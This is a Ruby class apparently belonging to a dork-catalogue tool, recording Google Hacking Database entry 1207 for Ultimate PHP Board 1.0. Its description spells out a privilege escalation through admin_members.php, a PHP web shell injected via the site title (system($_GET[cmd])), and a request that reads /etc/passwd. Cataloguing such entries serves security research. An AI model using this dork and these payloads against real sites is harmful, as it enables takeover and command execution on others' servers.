module Dorks
   class Dork1207 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1207",
            ghdb_url: "https://www.exploit-db.com/ghdb/1207",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2005-11-25",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by UPB" (b 1.0)|(1.0 final)|(Public Beta 1.0b)
EDORK
            description: <<~EDESC
dork: "Powered by UPB" (b 1.0)|(1.0 final)|(Public Beta 1.0b) this is a very old vulnerability discovered by Xanthic, can't find it in GHDB and I am surprised of how it still works... register, login, go to: http://[target]/[path_to_upb]/admin_members.php edit your level to 3 (Admin) and some Admin level to 1 (user), logout, re-login and... boom! You see Admin Panel link as I see it? The only link to the advisory that I found is this (in Italian): http://216.239.59.104/search?q=cache:iPdFzkDyS5kJ:www.mojodo.it/mjdzine/zina/numero3/n3f1.txt+xanthic+upb&hl=it and I have remote commads xctn for this now, edit site title with this code: Ultimate PHP Board"; error_reporting(0); ini_set("max_execution_time",0); system($_GET[cmd]); echo " now in config.dat we have: ... $title="Ultimate PHP Board "; error_reporting(0); ini_set("max_execution_time",0); system($_GET[cmd]); echo " "; ... in header.php we have: ... include "./db/config.dat"; ... so you can launch commands: http://[target]/[path]/header.php?cmd=cat%20/etc/passwd
EDESC
         })

      end
   end
end
